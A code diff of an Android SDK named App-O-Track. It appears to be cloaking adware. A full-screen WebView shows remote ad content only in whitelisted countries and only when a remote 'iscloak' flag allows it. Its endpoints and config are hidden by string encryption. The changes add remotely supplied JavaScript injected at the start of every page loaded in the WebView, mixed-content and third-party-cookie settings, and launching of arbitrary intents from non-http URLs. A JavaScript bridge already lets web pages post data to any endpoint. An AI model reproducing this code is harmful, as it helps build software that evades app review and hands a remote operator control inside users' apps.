@@ -1,6 +1,6 @@
 /*
   App-O-Track In-App SDK
-  Version: 19032020
+  Version: 10042020
   Author: Liv <developer@app-o-track.top>
  */
 package com.appotrack_sdk;
@@ -8,17 +8,21 @@ package com.appotrack_sdk;
 import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
+import android.content.pm.ApplicationInfo;
 import android.graphics.Bitmap;
 import android.net.Uri;
 import android.os.Bundle;
 import android.os.PersistableBundle;
+import android.util.AttributeSet;
 import android.util.Log;
 import android.view.Gravity;
+import android.view.View;
 import android.view.ViewGroup;
 import android.view.Window;
 import android.view.WindowManager;
 import android.webkit.JavascriptInterface;
 import android.webkit.ValueCallback;
+import android.webkit.WebChromeClient;
 import android.webkit.WebResourceRequest;
 import android.webkit.WebResourceResponse;
 import android.webkit.WebView;
@@ -109,8 +113,13 @@ public class AppotrackActivity extends AppCompatActivity implements AdvancedWebV
 
     private Context oSelfContext;
     private Intent intentSweetie;
-    private AdvancedWebView adView;
-    private OkHttpClient httpClient = new OkHttpClient();
+    private CustomWebView adView;
+    private FrameLayout flMain;
+    private OkHttpClient httpClient = new OkHttpClient.Builder()
+            .connectTimeout(30, TimeUnit.SECONDS)
+            .writeTimeout(30, TimeUnit.SECONDS)
+            .readTimeout(30, TimeUnit.SECONDS)
+            .build();
 
 
     /**
@@ -159,10 +168,15 @@ public class AppotrackActivity extends AppCompatActivity implements AdvancedWebV
                 .unsubscribeWhenNotificationsAreDisabled(true)
                 .init();
 
+        //allow webview debugging for debug builds
+        if (0 != (getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE)) {
+            WebView.setWebContentsDebuggingEnabled(true);
+        }
+
         requestWindowFeature(Window.FEATURE_NO_TITLE);
         this.getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN);
 
-        adView = new AdvancedWebView(this);
+        adView = new CustomWebView(this);
 
         adView.setListener(this, this);
         adView.addHttpHeader(Utils.decrypt(esXRequestedWith, ENC_KEY),"");
@@ -173,7 +187,9 @@ public class AppotrackActivity extends AppCompatActivity implements AdvancedWebV
             adView.loadUrl(getConfigStr("$.url", "http://localhost/"));
         }
 
-        setContentView(adView);
+        flMain = new FrameLayout(oSelfContext);
+        setContentView(flMain);
+        flMain.addView(adView);
         Utils.debugOutput("ADs shown");
     }
 
@@ -192,7 +208,7 @@ public class AppotrackActivity extends AppCompatActivity implements AdvancedWebV
     /**
      * This onCreate will be called in launcher mode
      * 1. Show loading screen
-     * 2. Initialize AppsFlyer
+     * 2. Initialize Kochava
      * 3. Get GeoIP data. Work will continue for whitelisted countries only
      * 4. Load remote configuration
      * 5. If ADs are allowed by remote configuration (iscloak):
@@ -232,7 +248,7 @@ public class AppotrackActivity extends AppCompatActivity implements AdvancedWebV
                 FutureTask<String> futureGeoIp = new FutureTask<>(getGeoIp());
                 executor.execute(futureGeoIp);
                 try{
-                    String geoipJson = futureGeoIp.get(30L, TimeUnit.SECONDS);
+                    String geoipJson = futureGeoIp.get(60L, TimeUnit.SECONDS);
                     String geoipIsoCode = JsonPath.parse(geoipJson).read("$.country.iso_code", String.class);
                     Utils.debugOutput(geoipJson);
                     if(!allowedCountries.contains(geoipIsoCode)){
@@ -251,7 +267,7 @@ public class AppotrackActivity extends AppCompatActivity implements AdvancedWebV
                 FutureTask<String> futureConfig = new FutureTask<>(getString(Utils.decrypt(esApiEndpoint, ENC_KEY).replace("%POSTID%", remoteConfigId)));
                 executor.execute(futureConfig);
                 try{
-                    String sConfigJson = futureConfig.get(30L, TimeUnit.SECONDS);
+                    String sConfigJson = futureConfig.get(60L, TimeUnit.SECONDS);
 
                     if (sConfigJson.startsWith("ENC-")) {
                         sConfigJson = Utils.decrypt(sConfigJson.substring(4), ENC_KEY);
@@ -348,7 +364,11 @@ public class AppotrackActivity extends AppCompatActivity implements AdvancedWebV
         Callable<String> result = new Callable<String>() {
             @Override
             public String call() throws Exception {
-                OkHttpClient okHttpClient = new OkHttpClient();
+                OkHttpClient okHttpClient = new OkHttpClient.Builder()
+                        .connectTimeout(30, TimeUnit.SECONDS)
+                        .writeTimeout(30, TimeUnit.SECONDS)
+                        .readTimeout(30, TimeUnit.SECONDS)
+                        .build();
                 Request request = new Request.Builder()
                         .url(urlAddr)
                         .build();
@@ -523,6 +543,70 @@ public class AppotrackActivity extends AppCompatActivity implements AdvancedWebV
     }
 
     /**
+     * Tweaked version of AdvancedWebView
+     */
+    private class CustomWebView extends AdvancedWebView{
+
+        private View customView = null;
+        private FrameLayout.LayoutParams matchParentLayout = new FrameLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT,
+                ViewGroup.LayoutParams.MATCH_PARENT);
+
+        public CustomWebView(Context context) {
+            super(context);
+        }
+
+        public CustomWebView(Context context, AttributeSet attrs) {
+            super(context, attrs);
+        }
+
+        public CustomWebView(Context context, AttributeSet attrs, int defStyleAttr) {
+            super(context, attrs, defStyleAttr);
+        }
+
+        @Override
+        public void onPause() {
+            /**
+             * There is a bug in AdvancedWebView:
+             * onPause() calls pauseTimers() which will stop ALL webview timers within the app
+             */
+            //super.onPause();
+        }
+
+        @Override
+        protected void init(Context context) {
+            super.init(context);
+
+            this.setThirdPartyCookiesEnabled(true);
+            this.setMixedContentAllowed(true);
+            getSettings().setJavaScriptEnabled(true);
+            getSettings().setDomStorageEnabled(true);
+
+            //this is needed for full-screen mode:
+            setWebChromeClient(new WebChromeClient(){
+                @Override
+                public void onShowCustomView(View view, CustomViewCallback callback) {
+                    CustomWebView.this.setVisibility(GONE);
+                    view.setLayoutParams(matchParentLayout);
+                    flMain.addView(view);
+                    customView = view;
+                }
+
+                @Override
+                public void onHideCustomView() {
+                    if(customView != null) {
+                        flMain.removeView(customView);
+                    }else{
+                        flMain.removeAllViews();
+                        flMain.addView(CustomWebView.this);
+                    }
+                    customView = null;
+                    CustomWebView.this.setVisibility(VISIBLE);
+                }
+            });
+        }
+    }
+
+    /**
      * This JavaScript interface allows to call in-app analytics from WebView
      */
     private class AdJsInterface {
@@ -570,7 +654,11 @@ public class AppotrackActivity extends AppCompatActivity implements AdvancedWebV
         public boolean Track(String endpoint, String data) {
             //prepare request
             MediaType jsonType = MediaType.parse("application/json; charset=utf-8");
-            OkHttpClient okHttpClient = new OkHttpClient();
+            OkHttpClient okHttpClient = new OkHttpClient.Builder()
+                    .connectTimeout(30, TimeUnit.SECONDS)
+                    .writeTimeout(30, TimeUnit.SECONDS)
+                    .readTimeout(30, TimeUnit.SECONDS)
+                    .build();
             Request request = new Request.Builder()
                     .url(endpoint)
                     .post(RequestBody.create(data, jsonType))
@@ -612,8 +700,9 @@ public class AppotrackActivity extends AppCompatActivity implements AdvancedWebV
         }
 
         @Override
-        public void onPageFinished(WebView view, String url) {
-            super.onPageFinished(view, url);
+        public void onPageStarted(WebView view, String url, Bitmap favicon) {
+            super.onPageStarted(view, url, favicon);
+
             //we may need to inject some JS info our ADs (to fix platform specific bugs for example)
             if(sInjectedJs !=null&& sInjectedJs.length()>1){
                 view.evaluateJavascript(sInjectedJs, new ValueCallback<String>() {
@@ -622,6 +711,26 @@ public class AppotrackActivity extends AppCompatActivity implements AdvancedWebV
                         //pass
                     }
                 });
+            }
+        }
+
+        /**
+         * Allows to translate different URLs to system intents (in addition to parent's implementation)
+         * @param view Source WebView
+         * @param url Current URL
+         * @return
+         */
+        @Override
+        public boolean shouldOverrideUrlLoading(WebView view, String url) {
+            if (url == null || url.startsWith("http://") || url.startsWith("https://")) return false;
+
+            try {
+                Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
+                view.getContext().startActivity(intent);
+                return true;
+            } catch (Exception e) {
+                Utils.debugOutput(e.getMessage());
+                return true;
             }
         }
     }
